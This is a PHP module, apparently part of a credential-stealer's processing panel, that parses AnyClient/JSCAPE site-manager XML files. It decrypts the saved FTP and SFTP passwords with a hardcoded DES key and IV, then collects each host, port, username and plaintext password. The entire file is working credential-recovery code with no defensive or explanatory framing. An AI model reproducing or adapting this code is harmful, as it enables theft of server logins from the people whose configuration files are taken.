<?php

class Module_anyclient extends Module_
{
    function GetKey_IV($Key, $Salt, $Iter_)
    {
        $Hash = $Key . $Salt;
        for ($i = 0; $i< $Iter_; $i++)
            $Hash = md5($Hash, TRUE);

        return str_split($Hash, 8);
    }

    function Decrypt($Source)
    {
        $KEY_ = "jscape Applet Site Cipher";
        $IV_ = array(-87, -101, -56, 50, 86, 53, -29, 3);

        $Res = '';
        $Cnt = 0;

        while(sizeof($IV_) > $Cnt)
        {
            $Res .= chr($IV_[$Cnt]);
            $Cnt++;
        }

        $IV_ = $Res;

        list($KEY_RES, $IV_RES) = $this->GetKey_IV($KEY_, $IV_, 19);
        return mcrypt_decrypt(MCRYPT_DES, $KEY_RES, base64_decode($Source), MCRYPT_MODE_CBC, $IV_RES)."\n";
    }
    function ProcessAnyFile($Source)
    {
        $XML_ = simplexml_load_string($Source);
        if(!$XML_)
            return FALSE;

        foreach($XML_->children() as $Element)
        {
            if(isset($Element['hostname']))
            {
                $Host = Assign_($Element['hostname']);
                $Port = Assign_($Element['port']);
                $User = Assign_($Element['username']);
                $Pass = $this->Decrypt($Element['password']);
                $Prot = Assign_($Element['connectionType']);

                $this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == "sftp") , $Port), $User, $Pass);
            }
        }

        $XML_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        if (strpos($Data, 'UTF-8') === false && strpos($Data, 'utf-8') === false)
        {
            $Data = utf8_encode($Data);
            $Data = str_replace('encoding="ISO-8859-1"', 'encoding="UTF-8"', $Data);
        }

        switch ($Version)
        {
        case 0:

            $this->ProcessAnyFile($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
